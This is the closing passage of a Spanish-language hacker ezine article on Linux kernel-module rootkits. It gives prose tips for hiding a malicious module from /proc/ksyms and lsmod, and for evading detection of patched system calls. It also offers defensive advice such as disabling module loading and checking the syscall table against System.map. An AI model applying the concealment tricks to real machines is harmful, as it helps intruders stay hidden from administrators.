+  printk("(HM) Hide_Module3 by Ripe - <ripe@7a69ezine.org>\n");
+  printk("(HM) UnLoaded!\n");
+#endif
+}
+
+---/ hide_module3.c /---
+
+     Bien, una cosa mas a desctacar es que la carga de un modulo, deja ademas
+otra pequeña huella, esta se ella en /proc/ksyms, pues en el se podran ver los
+symbolos del modulo, para evitar esto es muy sencillo, y nos bastara con
+llamar a la macro EXPORT_NO_SYMBOLS en nuestro modulo (en la distribucion
+Debian, se deja como huella en /proc/ksyms de las cabeceras ELF).
+     
+     Tambien podria llegar a ser posible ocultar modulos hookeando la
+syscall query_module (la usada por lsmod para consultar los modulos
+cargados), pero no lo he intentado. Si digo es esto, es para que alguno de
+vosotros se anime a intentarlo :)
+
+
+
+6. Soluciones para la administracion
+------------------------------------
+
+     Como hemos podido ver a lo largo de este articulo los LKMs pueden ser
+una autentica pesadilla para los administradores de sistemas. Un buen
+rootkit para el kernel puede dejar totalmente indefenso a un administrador
+de sistemas. En este punto 6 voy a tratar de ayudar a los administradores de
+sistemas a defenderse de este tipo de ataques.
+
+
+
+
+    6.1. Recomendaciones para asegurar el kernel
+    --------------------------------------------
+    
+     Dicen que es mejor prevenir que curar, y en este caso ocurre lo mismo.
+Es mejor evitar que cargen un LKM con mala idea en nuestro sistema a tener
+que detectarlo una vez cargado. Para ello lo que yo recomiendo es quitar del
+kernel el soporte para modulos cargables (sobretodo si se trata de
+servidores criticos) y dejar todo el kernel en una sola imagen. Obiamente
+esp nos obliga a recompilar todo el kernel siempre que queramos
+añadirle/quitarle/modificar algo. En el caso de la extrema necesidad del uso
+de los LKMs deberiamos tomar medidas para dificultar la carga del modulo.
+Una de ellas puede ser el uso de modprotect.c (persentado en la seccion 4.11
+de este mismo doc), aun que aun asi dejamos /dev/kmem al descuvierto (no lo
+voy a explicar aqui, pero tambien es posible troyanizar el kernel atraves de
+/dev/kmem). Cambiar el nombre del ejecutable "insmod" puede despistar a
+algunos script kiddies, tambien podemos dejar un insmod que loguee todos las
+inserciones de modulos.
+
+
+
+
+    6.2. Pelea: Detectando y evadiendo la deteccion de syscalls troyanizadas.
+    -------------------------------------------------------------------------
+
+     Si no hemos tomado precauciones es probable que nuestro preciado kernel
+ya haya sufrido algun tipo de mutacion maligna. ¿Como podemos detectar si
+estamos troyanizados?
+
+     Todos los modulos que hemos visto modificaban algun valor de la
+sys_call_table, por lo que es por ahi por donde debemos atacar. ¿Como? No es
+dificil codear algo que lea de /dev/kmem la sys_call_table (con la syscall
+query_module podemos sacar la posicion en la memoria de dicho symbolo), y
+comparar el valor de los elementos del array con el valor que deberia tener.
+¿Como sabemos el valor que deberia tener? Facil. Siempre, tras finalizar la
+compilacion del kernel se crea un fichero llamado System.map que contiene
+todos los symbolos del kernel, con la posicion en la memoria en la que se
+carga. Asi pues si sys_call_table[__NR_getdents] no tiene la posicion en la
+memoria que dicta sys_getdents en System.map quiere decir que algo malo esta
+pasando :/
+
+    Pero no es oro todo lo que reluce. Si bien todos los modulos presentados
+aqui modifican algun valor de la sys_call_table, es posible troyanizar una
+syscall sin modificarlo. La forma de hacerlo es colocando una instruccion de
+salto en el inicio de codigo de la syscall. Para saber la posicion en la
+memoria de la syscall en question basta con consultar los valores de la
+sys_call_table.
+
+NOTA: He sido muy breve en este punto, ya que es muy posible que dedique mas
+      adelante un articulo completo a la deteccion de LKMs troyanos.
+      
+      
+      
+      
+7. Marchando
+------------
+
+    Bueno, todo lo que empieza debe acabar, y este articulo llega ahora
+mismo a ese punto que llaman "FIN". Estoy muy agradecido a todos vosotros
+por leer este doc y haber llegado hasta aqui :)
+
+
+
+    7.1. Agradecimientos
+    --------------------
+    
+     A toda la gente de 7a69 y #root (irc-hispano). 
+
+     A Doing sobretodo por ser como es y ayudar siempre que es necesario.
+
+     A mi abuelo por lo mal que lo esta pasando (te quiero).
+     
+     A Marta por ser igual que un kernel :)
+     
+     A Princc3sa por todo...
+     
+     A tuxisuau por no dejar de hablar ni un solo minuto :P
+     
+     A trycky por el buen humor que siempre se gasta.
+     
+     Bufff, seguro que me dejo a muchos... asi que incluire un... A todo el
+mundo por formar parte de este "bonito" mundo.
+
+
+
+    7.2. Saludos
+    ------------
+    
+    Orden alfavetico... no haya quejas :)
+    
+    Alcalde, AiNaKeR, Anarion, Anonimo (ya sabes :P), b0nk, cHuKy, Doing, 
+EleCtrAxX, ICEFIRE, Ireick, Overdrive, Karbonato, Princc3sa, Scsix, Tahum, 
+Trycky, Tuxisuau....
+
+NOTA: Lo de Anonimo es por si me dejo a alguien, jejeje. Asi que ya sabes, si
+      no sales, es que Anonimo eres tu :P
+
+
+
+    7.3. Contactar
+    --------------
+    
+     Bueno... para qualquier cosa. Quejas, fallos en el doc, agradecimientos, 
+elogios, proposiciones indecentes o de trabajo..
+
+               ripe@7a69ezine.org
+	       
+     O de vez en cuando en #root del Irc-hispano.
+     
+     
+     
+    7.4. Bibliografia
+    -----------------
+    
+     - Phrack#52 Articulo 18 "Weakening the Linux Kernel"
+     
+     - Phrack#55 Articulo 12 "Building Into The Linux Network Layer"
+
+     - SET#22 Articulo 0x0A "Linux Kernel Modules : LKMs"
+
+     - Sources de otros modulos.
+
+     - Los sources del kernel 2.2.18
+
+
+
+
+    7.5. Nota final
+    ---------------
+     
+     Ya he empezado a trabajar con el kernel 2.4 asi que es mas que posible
+que para el proximo numero haya algo sobre modulos en 2.4. Obiamente no voy
+a empezar desde 0 ni mucho menos (para eso ya esta este documento).
+Aprobechare el proximo documento para explicar cosas que no he explicado
+aqui como spinlocks, timers, colas de tareas.... Bueno, ya lo vereis. Tambien
+es muy posible que veais mas backdoors remotas, porque es pecisamente una de
+las cosas en las que estoy trabajando, tengo varias ideas, pero este no es
+momento ni lugar para comentarlas, asi que, nos vemos.
+
+*EOF*
